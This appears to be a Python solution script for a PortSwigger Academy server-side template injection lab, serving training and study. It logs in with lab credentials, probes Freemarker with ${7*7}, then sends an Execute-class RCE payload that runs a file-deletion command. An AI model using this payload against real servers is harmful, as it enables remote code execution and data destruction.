#!/usr/bin/env python3
"""
Server-side template injection using documentation
PortSwigger Web Security Academy -- Server-Side Template Injection

Companion script for the writeup: 03-server-side-template-injection-using-documentation.md

What this does:
    Logs in as content-manager, confirms Freemarker via `${7*7}` -> 49 on the
    non-destructive template preview endpoint, then instantiates Freemarker's
    `freemarker.template.utility.Execute` class through the `new()` built-in
    (the RCE primitive Freemarker's own FAQ documents) to run the command.

Usage:
    python 03-server-side-template-injection-using-documentation.py <lab-url>
    e.g. python 03-server-side-template-injection-using-documentation.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

TEMPLATE_URL = "/product/template?productId=1"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url, follow_redirects=True, timeout=15)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not match:
        match = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return match.group(1) if match else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Logging in as content-manager")
    csrf = _get_csrf(client, f"{lab_url}/login")
    client.post(f"{lab_url}/login",
                data={"csrf": csrf, "username": "content-manager", "password": "C0nt3ntM4n4g3r"})
    print("[+] Logged in.")

    tpl_url = f"{lab_url}{TEMPLATE_URL}"

    print("[*] Confirming Freemarker via template preview: ${7*7}")
    tpl_csrf = _get_csrf(client, tpl_url)
    detect_resp = client.post(tpl_url, data={
        "csrf": tpl_csrf, "template": "${7*7}", "template-action": "preview",
    })
    if "49" in detect_resp.text:
        print("[+] Freemarker SSTI confirmed: ${7*7} -> 49")
    else:
        print("[!] Detection inconclusive, proceeding anyway")

    print("[*] Sending Execute-class RCE payload via template preview")
    rce_payload = ('<#assign ex="freemarker.template.utility.Execute"?new()>'
                    '${ex("rm /home/carlos/morale.txt")}')
    tpl_csrf2 = _get_csrf(client, tpl_url)
    client.post(tpl_url, data={
        "csrf": tpl_csrf2, "template": rce_payload, "template-action": "preview",
    })

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via Freemarker Execute class.")
    else:
        print("[-] Not solved yet -- inspect the response manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
